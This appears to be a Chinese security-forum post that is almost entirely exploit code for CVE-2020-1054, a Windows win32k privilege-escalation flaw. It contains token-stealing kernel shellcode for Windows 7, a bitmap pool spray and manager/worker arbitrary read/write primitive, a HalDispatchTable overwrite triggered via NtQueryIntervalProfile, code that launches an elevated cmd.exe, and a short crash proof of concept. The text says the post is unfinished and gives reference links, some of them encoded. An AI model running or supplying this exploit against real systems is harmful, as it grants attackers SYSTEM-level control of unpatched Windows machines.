
# CVE-2020-1054 利用代码

```
#pragma once
#include <cstdio>
#include <windows.h>
#include <Psapi.h>
#define PAGE\_SIZE 0x1000
#define TYPE\_WINDOW 1
#define POOL\_HEADER\_SIZE 0x10
EXTERN\_C\_START
ULONG64 GetPEB();
NTSTATUS ShellCodeInWin7();
EXTERN\_C\_END
/\*
.code
ShellCodeInWin7 proc
push r8
push r9
; 从KPCR中获取当前线程\_ETHREAD
mov rax, gs:[188h]
; 从\_ETHREAD中获取当前进程\_EPROCESS
mov rax, [rax+070h]
mov r8, rax
find\_system\_proc:
; 获取下一进程EPROCESS地址
mov rax, [rax+188h]
sub rax, 188h
; 获取PID
mov rdx, [rax+180h]
; 判断pid是否为4，不为4则跳转
cmp rdx, 4
jne find\_system\_proc
; 将system的token赋值给本进程,并增加引用计数
mov rax, [rax+208h]
and al, 0f0h
mov [r8+208h], rax
mov r9, 2
add [rax-30h], r9
; 设置返回值，退出函数
mov rax, 1
pop r9
pop r8
ret
ShellCodeInWin7 endp
.code
GetPEB proc
mov rax, gs:[60h]
ret
GetPEB endp
end
\*/
typedef DWORD64 QWORD;
typedef PDWORD64 PQWORD;
typedef struct \_LARGE\_UNICODE\_STRING {
ULONG Length;
ULONG MaximumLength : 31;
ULONG bAnsi : 1;
PWSTR Buffer;
} LARGE\_UNICODE\_STRING, \* PLARGE\_UNICODE\_STRING;
typedef struct \_HEAD
{
HANDLE h;
DWORD clockObj;
}HEAD, \* PHEAD;
typedef struct \_THROBJHEAD
{
HEAD h;
PVOID pti;
}THROBJHEAD, \* PTHROBJHEAD;
typedef struct \_THRDESKHEAD
{
THROBJHEAD h;
PVOID rpdesk;
PVOID pSelf;
}THRDESKHEAD, \* PTHRDESKHEAD;
typedef struct \_GDICELL64 {
PVOID pKernelAddress;
USHORT wProcessId;
USHORT wCount;
USHORT wUpper;
USHORT wType;
PVOID pUserAddress;
} GDICELL64, \* PGDICELL64;
typedef NTSTATUS(WINAPI\* lpfnNtQueryIntervalProfile)(IN QWORD Src, IN OUT PQWORD Profile);
VOID ShowError(char\* str, DWORD dwErrorCode)
{
printf("%s Error 0x%X\n", str, dwErrorCode);
}
ULONG64 GetNTBase()
{
ULONG64 Base[0x1000];
DWORD dwRet = 0;
ULONG64 ulKrnlBase = 0;
if (EnumDeviceDrivers((LPVOID\*)&Base, sizeof(Base), &dwRet))
{
ulKrnlBase = Base[0];
}
else
{
printf("EnumDeviceDrivers");
}
return ulKrnlBase;
}
PVOID GetHalQuerySystemInformation()
{
PVOID pXHalQuerySystemInformation = NULL;
ULONG64 ulHalDispatchTable = 0;
HMODULE hKernel = NULL;
ULONG64 ulOsBase = 0;
ulOsBase = GetNTBase();
if (!ulOsBase)
{
goto exit;
}
hKernel = LoadLibraryA("ntoskrnl.exe");
if (!hKernel)
{
printf("LoadLibrary");
goto exit;
}
// 获取内核HalDispatchTable函数表地址
ulHalDispatchTable = (ULONG64)GetProcAddress((HMODULE)hKernel, "HalDispatchTable");
if (!ulHalDispatchTable)
{
printf("GetProcAddress");
goto exit;
}
ulHalDispatchTable = ulHalDispatchTable - (ULONG64)hKernel + ulOsBase;
pXHalQuerySystemInformation = (PVOID)(ulHalDispatchTable + sizeof(ULONG64));
exit:
if (hKernel) FreeLibrary(hKernel);
return pXHalQuerySystemInformation;
}
BOOL CallNtQueryIntervalProfile()
{
BOOL bRet = TRUE;
NTSTATUS status = 0;
HMODULE hDll = NULL;
hDll = LoadLibraryA("ntdll.dll");
if (!hDll)
{
printf("LoadLibrary ntdll.dll");
return FALSE;
}
lpfnNtQueryIntervalProfile NtQueryIntervalProfile = (lpfnNtQueryIntervalProfile)GetProcAddress(hDll, "NtQueryIntervalProfile");
if (!NtQueryIntervalProfile)
{
bRet = FALSE;
printf("GetProcAddress");
return FALSE;
}
QWORD dwRet = 0;
QWORD dwProfileTotalIssues = 0x3;
status = NtQueryIntervalProfile(dwProfileTotalIssues, &dwRet);
if (status < 0)
{
printf("NtQueryIntervalProfile");
return FALSE;
}
}
//成功扩大hManager的读写范围之后，就可以通过修改hWorker的pvScan0来实现任意地址读写
BOOL EnablePrivilege\_CVE\_2020\_1054(HBITMAP hManager, HBITMAP hWorker, ULONG64 ulSize)
{
PVOID pBuf = NULL;
pBuf = malloc(ulSize + 0x10);
if (!pBuf)
{
printf("malloc error");
return FALSE;
}
ZeroMemory(pBuf, ulSize + 0x10);
if (!GetBitmapBits(hManager, ulSize, pBuf))
{
printf("GetBitmapBits error");
return FALSE;
}
ULONG64 ulHalQuerySystenInformation = (ULONG64)GetHalQuerySystemInformation();
if (!ulHalQuerySystenInformation)
{
printf("GetHalQuerySystemInformation error");
return FALSE;
}
\*(PULONG64)((ULONG64)pBuf + ulSize) = ulHalQuerySystenInformation;
if (!SetBitmapBits(hManager, ulSize + sizeof(ULONG64), pBuf))
{
printf("SetBitmapBits");
return FALSE;
}
ULONG64 ulOrg = 0;
if (!GetBitmapBits(hWorker, sizeof(ULONG64), &ulOrg))
{
printf("GetBitmapBits error");
return FALSE;
}
ULONG64 ulShellCode = (ULONG64)ShellCodeInWin7;
if (!SetBitmapBits(hWorker, sizeof(ULONG64), &ulShellCode))
{
printf("GetBitmapBits");
return FALSE;
}
if (!CallNtQueryIntervalProfile())
{
return FALSE;
}
if (!SetBitmapBits(hWorker, sizeof(ULONG64), &ulOrg))
{
printf("GetBitmapBits");
return FALSE;
}
}
ULONG64 GetBitMapKerAddr(HBITMAP hBitMap)
{
ULONG64 pKernelAddress = NULL;
ULONG64 ulPEB = GetPEB();
ULONG64 ulGdiSharedHandleTable = \*(PULONG64)(ulPEB + 0xF8);
PGDICELL64 pGdiCell = NULL;
pGdiCell = (PGDICELL64)(ulGdiSharedHandleTable + sizeof(GDICELL64) \* ((ULONG64)hBitMap & 0xFFFF));
return (ULONG64)pGdiCell->pKernelAddress;
}
static VOID CreateCmd()
{
STARTUPINFO si = { sizeof(si) };
PROCESS\_INFORMATION pi = { 0 };
si.dwFlags = STARTF\_USESHOWWINDOW;
si.wShowWindow = SW\_SHOW;
WCHAR wzFilePath[MAX\_PATH] = { L"cmd.exe" };
BOOL bReturn = CreateProcessW(NULL, wzFilePath, NULL, NULL, FALSE, CREATE\_NEW\_CONSOLE, NULL, NULL, (LPSTARTUPINFOW)&si, &pi);
if (bReturn) CloseHandle(pi.hThread), CloseHandle(pi.hProcess);
}
int main()
{
//喷射大量0x7000大小的BitMap对象
if (!LoadLibraryA("user32.dll"))
{
printf("LoadLibrary error");
return 0;
}
HDC hdc = NULL;
hdc = CreateCompatibleDC(NULL);
if (!hdc)
{
printf("CreateCompatibleDC error");
return 0;
}
HBITMAP hExpBitMap = NULL;
hExpBitMap = CreateCompatibleBitmap(hdc, 0x51500, 0x100);
if (!hExpBitMap)
{
printf("CreateCompatibleBitmap error");
return 0;
}
ULONG64 ulExpBitMap = GetBitMapKerAddr(hExpBitMap);
ULONG64 oob\_target = (ulExpBitMap & 0xfffffffffff00000) + 0x0000000100000000;
HBITMAP hManager = NULL, hWorker = NULL;
ULONG64 ulManager = 0, ulWorker = 0;
while (true)
{
HBITMAP hBitMap = NULL;
hBitMap = CreateCompatibleBitmap(hdc, 0x6F000, 0x8);
if (!hBitMap)
{
printf("CreateCompatibleBitmap error");
return 0;
}
ULONG64 ulBitMapKerAddr = GetBitMapKerAddr(hBitMap);
if (hManager)
{
ulWorker = ulBitMapKerAddr;
hWorker = hBitMap;
break;
}
else if (ulBitMapKerAddr >= oob\_target && (ulBitMapKerAddr & 0x0000000000070000) == 0x70000)
{
ulManager = ulBitMapKerAddr;
hManager = hBitMap;
}
}
// 触发漏洞，修改hManger的可读写范围
SelectObject(hdc, hExpBitMap);
DrawIconEx(hdc, 0x900, 0xb, (HICON)0x40000010003, 0x0, 0xffe00000, 0x0, 0x0, 0x1);
ULONG64 ulSize = ulWorker + 0x50 - (ulManager + 0x238);
if (!EnablePrivilege\_CVE\_2020\_1054(hManager, hWorker, ulSize))
{
printf("error");
return 0;
}
CreateCmd();
return 0;
}
```

这篇是1-4正好赶上换域名时编辑的帖子，换完全没了，心态炸了。。。

还未写完，后续补补，怕编辑中的帖子又没了

## 参考链接

477K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6U0M7s2u0Q4x3X3c8*7k6i4u0G2i4K6u0W2j5$3S2W2j5$3E0H3L8$3W2F1N6q4)9J5k6h3y4G2L8g2)9J5c8Y4k6#2L8r3&6K6i4K6u0r3j5%4m8J5K9h3c8Q4x3X3b7J5x3e0f1K6i4K6u0r3

f16K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2S2L8Y4q4#2j5h3&6C8k6g2)9J5k6h3y4G2L8g2)9J5c8Y4m8G2M7%4c8Q4x3V1k6A6k6q4)9J5c8U0t1H3z5e0x3J5z5g2)9J5x3$3R3J5i4K6u0V1x3l9`.

https://bbs.kanxue.com/thread-273701.htm
https://bbs.kanxue.com/thread-260884.htm

## 漏洞poc

```c
#include <Windows.h>
#include <inttypes.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char *argv[])
{
LoadLibrary("user32.dll");
HDC r0 = CreateCompatibleDC(0x0);
HBITMAP r1 = CreateCompatibleBitmap(r0, 0x9f42, 0xa);
SelectObject(r0, r1);
DrawIconEx(r0, 0x0, 0x0, 0x30000010003, 0x0, 0xfffffffffebffffc, 0x0, 0x0, 0x6);

return 0;
}
```

e35K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6D9k6h3q4J5L8W2)9J5k6h3#2A6j5%4u0G2M7$3!0X3N6q4)9J5k6h3y4G2L8g2)9J5c8Y4A6Z5i4K6u0V1j5$3&6Q4x3V1k6%4K9h3&6V1L8%4N6K6i4K6u0r3N6$3W2F1x3K6u0Q4x3V1k6S2M7r3W2Q4x3V1k6%4K9h3&6Y4k6r3W2Q4x3V1k6F1k6W2)9J5k6s2N6A6L8X3N6V1K9g2)9J5k6r3y4J5k6h3q4@1k6h3y4G2L8i4m8S2N6r3W2T1L8r3g2V1j5H3`.

`CreateCompatibleDC` 函数 (DC) 创建与指定设备兼容的内存设备上下文。
